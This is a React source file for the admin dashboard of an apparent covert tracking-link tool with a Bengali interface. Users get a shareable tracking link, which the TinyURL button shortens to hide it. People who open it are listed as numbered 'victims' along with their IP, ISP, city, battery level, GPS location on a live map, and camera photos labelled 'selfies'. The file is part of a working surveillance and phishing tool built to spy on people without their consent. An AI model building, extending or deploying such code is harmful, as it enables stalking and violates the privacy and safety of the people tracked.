
import React, { useState, useEffect } from 'react';
import { User, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { collection, query, where, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { auth, db } from '../firebase';

interface LogEntry {
  id: string;
  timestamp: any;
  device?: { name: string; model: string; userAgent: string; };
  battery?: { level: number; charging: boolean };
  location?: { lat: number; lng: number; accuracy: number };
  photoUrls?: string[];
  firstPhoto?: string;
  ip?: string;
  city?: string;
  isp?: string;
  status?: string;
}

const Dashboard: React.FC<{ user: User }> = ({ user }) => {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [copySuccess, setCopySuccess] = useState(false);
  const [shortUrl, setShortUrl] = useState('');
  const [shortening, setShortening] = useState(false);
  const [viewMap, setViewMap] = useState<{lat: number, lng: number} | null>(null);
  const [viewPhotos, setViewPhotos] = useState<string[] | null>(null);
  
  const baseUrl = window.location.origin + window.location.pathname;
  const trackerLink = `${baseUrl}#/trk/${user.uid}`;

  useEffect(() => {
    const q = query(collection(db, "logs"), where("userId", "==", user.uid));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })) as LogEntry[];
      // Sort: Oldest first for numbering, then reverse for display
      data.sort((a, b) => (a.timestamp?.seconds || 0) - (b.timestamp?.seconds || 0));
      setLogs([...data].reverse());
      setLoading(false);
    });
    return () => unsubscribe();
  }, [user.uid]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 2000);
  };

  const generateTinyUrl = async () => {
    setShortening(true);
    try {
      const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(trackerLink)}`);
      if (response.ok) setShortUrl(await response.text());
    } catch (e) { alert("API failed"); }
    setShortening(false);
  };

  return (
    <div className="min-h-screen bg-[#F8FAFC] font-['Hind_Siliguri']">
      <nav className="bg-white border-b border-slate-200 px-6 py-4 flex justify-between items-center sticky top-0 z-40">
        <div className="flex items-center gap-3">
           <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
              <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
           </div>
           <h1 className="text-md font-black text-slate-800">অ্যাডমিন প্যানেল</h1>
        </div>
        <button onClick={() => signOut(auth)} className="bg-red-50 text-red-600 px-4 py-2 rounded-xl text-[10px] font-black hover:bg-red-100 transition-colors">লগ আউট</button>
      </nav>

      <main className="max-w-4xl mx-auto p-4 md:p-8 space-y-6">
        {/* Counter Card */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
           <div className="md:col-span-2 bg-blue-600 p-8 rounded-[28px] text-white shadow-xl shadow-blue-100">
              <h2 className="text-xl font-black">হ্যালো, {user.displayName?.split(' ')[0]}</h2>
              <p className="text-blue-100 text-[11px] mt-1">আপনার ট্র্যাকিং লিংকটি শেয়ার করুন এবং ফলাফল দেখুন।</p>
           </div>
           <div className="bg-white p-6 rounded-[28px] border border-slate-100 shadow-sm flex flex-col items-center justify-center text-center">
              <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest mb-1">মোট ভিক্টিম</p>
              <h3 className="text-5xl font-black text-blue-600">{logs.length}</h3>
           </div>
        </div>

        {/* Link Box */}
        <div className="bg-white p-6 rounded-[28px] border border-slate-100 shadow-sm space-y-4">
           <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest">আপনার ট্র্যাকিং লিংক</p>
           <div className="flex flex-col md:flex-row gap-2">
              <input readOnly value={shortUrl || trackerLink} className="flex-1 bg-slate-50 border border-slate-200 px-4 py-3 rounded-xl text-[10px] font-mono text-blue-700 outline-none" />
              <div className="flex gap-2">
                <button onClick={() => copyToClipboard(shortUrl || trackerLink)} className="flex-1 bg-slate-900 text-white px-6 py-3 rounded-xl text-[10px] font-black">
                  {copySuccess ? 'কপি হয়েছে' : 'কপি করুন'}
                </button>
                {!shortUrl && (
                  <button onClick={generateTinyUrl} disabled={shortening} className="flex-1 bg-blue-600 text-white px-6 py-3 rounded-xl text-[10px] font-black">
                    {shortening ? '...' : 'TinyURL'}
                  </button>
                )}
              </div>
           </div>
        </div>

        {/* Reports */}
        <div className="space-y-4">
           <h3 className="text-xs font-black text-slate-500 uppercase tracking-widest px-2">লাইভ রিপোর্টস</h3>
           <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {logs.map((log, index) => {
                const victimNumber = logs.length - index;
                return (
                  <div key={log.id} className="bg-white p-5 rounded-[26px] border border-slate-100 shadow-sm relative overflow-hidden group">
                     <div className="absolute top-4 right-5 bg-blue-50 text-blue-600 px-3 py-1 rounded-full text-[9px] font-black uppercase">
                       Victim #{victimNumber}
                     </div>
                     
                     <div className="space-y-4">
                        <div className="pt-2">
                           <p className="text-[9px] font-black text-slate-400 uppercase mb-1">Device & Network</p>
                           <p className="text-xs font-bold text-slate-800">{log.device?.name || 'Unknown'}</p>
                           <p className="text-[10px] text-blue-500 font-mono mt-0.5">{log.ip} <span className="text-slate-300 ml-1">|</span> {log.isp || 'WiFi/Mobile Data'}</p>
                        </div>

                        <div className="grid grid-cols-2 gap-2">
                           <div className="bg-slate-50 p-3 rounded-2xl border border-slate-100">
                              <p className="text-[8px] text-slate-400 font-black uppercase">City</p>
                              <p className="text-[10px] font-black text-slate-700 truncate">{log.city || 'Unknown'}</p>
                           </div>
                           <div className="bg-slate-50 p-3 rounded-2xl border border-slate-100">
                              <p className="text-[8px] text-slate-400 font-black uppercase">Battery</p>
                              <p className="text-[10px] font-black text-slate-700">{log.battery ? `${log.battery.level}%` : 'N/A'}</p>
                           </div>
                        </div>

                        <div className="flex gap-2">
                           <button 
                             onClick={() => setViewPhotos(log.photoUrls || (log.firstPhoto ? [log.firstPhoto] : []))}
                             className="flex-1 bg-slate-900 text-white py-3 rounded-xl text-[10px] font-black"
                           >
                             Selfie ({log.photoUrls?.length || (log.firstPhoto ? 1 : 0)})
                           </button>
                           {log.location && (
                             <button 
                               onClick={() => setViewMap(log.location || null)}
                               className="flex-1 bg-blue-600 text-white py-3 rounded-xl text-[10px] font-black shadow-md shadow-blue-50"
                             >
                               Live Map
                             </button>
                           )}
                        </div>
                        
                        <p className="text-[8px] text-slate-300 font-mono text-center pt-1 italic">
                          {log.timestamp?.toDate().toLocaleString('bn-BD')}
                        </p>
                     </div>
                  </div>
                );
              })}
           </div>
        </div>

        {/* Footer */}
        <footer className="pt-10 pb-10 text-center">
           <div className="bg-white inline-flex items-center gap-3 px-5 py-2.5 rounded-2xl border border-slate-100 shadow-sm">
              <div className="w-8 h-8 bg-blue-50 rounded-lg flex items-center justify-center text-blue-600">
                 <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
              </div>
              <div className="text-left">
                <p className="text-[7px] text-slate-400 font-black uppercase leading-none">Developed By</p>
                <a href="https://www.facebook.com/profile.php?id=61569035777496" target="_blank" className="text-[11px] font-black text-slate-800">Arefin Foysal</a>
              </div>
           </div>
        </footer>
      </main>

      {/* Modals are the same logic as before but with better styling */}
      {viewMap && (
        <div className="fixed inset-0 z-[100] bg-slate-900/90 backdrop-blur-sm flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-lg rounded-[30px] overflow-hidden shadow-2xl">
              <div className="p-5 border-b flex justify-between items-center bg-slate-50">
                 <h4 className="font-black text-slate-800 text-sm">ভিক্টিম লোকেশন ম্যাপ</h4>
                 <button onClick={() => setViewMap(null)} className="w-8 h-8 bg-white rounded-full flex items-center justify-center text-slate-400">✕</button>
              </div>
              <div className="aspect-video w-full">
                 <iframe 
                    width="100%" 
                    height="100%" 
                    frameBorder="0" 
                    src={`https://maps.google.com/maps?q=${viewMap.lat},${viewMap.lng}&z=16&output=embed`}
                 />
              </div>
              <div className="p-5 flex gap-2">
                 <a href={`https://www.google.com/maps?q=${viewMap.lat},${viewMap.lng}`} target="_blank" className="flex-1 bg-blue-600 text-white py-3 rounded-xl font-black text-[10px] text-center">Open in Google Maps</a>
                 <button onClick={() => setViewMap(null)} className="flex-1 bg-slate-100 text-slate-600 py-3 rounded-xl font-black text-[10px]">বন্ধ করুন</button>
              </div>
           </div>
        </div>
      )}

      {viewPhotos && (
        <div className="fixed inset-0 z-[100] bg-slate-900/95 backdrop-blur-md flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-xl rounded-[30px] overflow-hidden">
              <div className="p-5 border-b flex justify-between items-center">
                 <h4 className="font-black text-slate-800 text-sm">ভিক্টিম সেলফি</h4>
                 <button onClick={() => setViewPhotos(null)} className="w-8 h-8 bg-slate-50 rounded-full flex items-center justify-center text-slate-400">✕</button>
              </div>
              <div className="p-5 grid grid-cols-2 gap-3 overflow-y-auto max-h-[60vh] bg-slate-50">
                 {viewPhotos.map((url, i) => (
                   <img key={i} src={url} className="rounded-2xl border-2 border-white shadow-sm aspect-square object-cover bg-white" />
                 ))}
              </div>
              <div className="p-5 text-center">
                 <button onClick={() => setViewPhotos(null)} className="bg-slate-900 text-white px-8 py-3 rounded-xl font-black text-[10px]">গ্যালারি বন্ধ করুন</button>
              </div>
           </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
